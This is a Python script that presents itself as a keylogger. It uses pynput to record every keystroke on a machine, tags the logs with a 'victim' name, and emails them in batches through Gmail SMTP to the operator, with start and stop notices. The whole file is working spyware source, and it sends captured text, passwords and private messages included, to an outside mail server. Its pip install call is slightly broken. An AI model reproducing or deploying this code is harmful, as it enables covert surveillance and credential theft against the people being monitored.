import sys , subprocess , smtplib
try:
    from pynput.keyboard import Key , Listener
except ModuleNotFoundError:
    subprocess.check_call([sys.executable , "-m" , "pip install" , "pynput"])
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from time import ctime

email_no = 0

#Email Setup
print("Simple keylogger to log the keystrokes and email to given mail id periodically.")
print('Impported Libs .')
email = input("Enter Reciever Email ID : ")
password = input("Enter Reciever Email Password : ")
victim = input("Enter Victim Name/Identification for Email Subject") 
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email , password)

def send_start():
    global word
    global full_log
    global email
    global email_char_limit
    global email_no
    global victim

    email_no += 1

    msg = MIMEMultipart(victim)
    msg["Subject"] = f"KeyLogs : {victim} Laptop : STARTED LOGGING"
    msg["From"] = email
    msg["To"] = email

    data = f"KeyLogger : KeyLogs : {victim} Laptop : {ctime()} \n\n\n The Capturing Of Keystrokes On This Device Is Initiated Successfully !!"

    part1 = MIMEText(data,"plain")
    msg.attach(part1)
    
    
    server.sendmail(
        email,
        email,
        msg.as_string()
        )
    #END!

def send_stop():
    global word
    global full_log
    global email
    global email_char_limit
    global email_no
    global victim

    email_no += 1

    msg = MIMEMultipart(f"{victim} Laptop")
    msg["Subject"] = f"KeyLogs:{victim} Laptop:STOPPED LOGGING"
    msg["From"] = email
    msg["To"] = email

    data = f"KeyLogger : KeyLogs : {victim} Laptop : {ctime()} \n\n\n The Capturing Of Keystrokes On This Device Is TERMINATED Successfully !!"
    lastdata = f"\nLast Word (word) : {word}"
    lastlog = f"\nLast Log (full_log) : {full_log}"
    
    part1 = MIMEText(data,"plain")
    part2 = MIMEText(lastdata,"plain")
    part3 = MIMEText(lastlog,"plain")

    msg.attach(part1)
    msg.attach(part2)
    msg.attach(part3)
    
    
    server.sendmail(
        email,
        email,
        msg.as_string()
        )
    #END!

send_start()

#Logger
full_log = ''
word = ''
email_char_limit = 50

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit
    global victim

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
        print(f'Captured Text : {char}')

    if key == Key.esc:
        
        send_stop()
        print('Keylogging Stopped')
        return False


def send_log():
    global word
    global full_log
    global email
    global email_char_limit
    global email_no
    global victim

    email_no += 1

    msg = MIMEMultipart(f"{victim} Laptop")
    msg["Subject"] = f"KeyLogs : {victim} Laptop : {email_no}"
    msg["From"] = email
    msg["To"] = email

    data = f"KeyLogger : KeyLogs : {victim} Laptop : {ctime()} \n\n\n {full_log}"

    part1 = MIMEText(data,"plain")
    msg.attach(part1)
    
    
    server.sendmail(
        email,
        email,
        msg.as_string()
        )

    print(f'Sent Email ! \n Data Sent : {full_log}')
    
with Listener(on_press=on_press) as listener:
    listener.join()
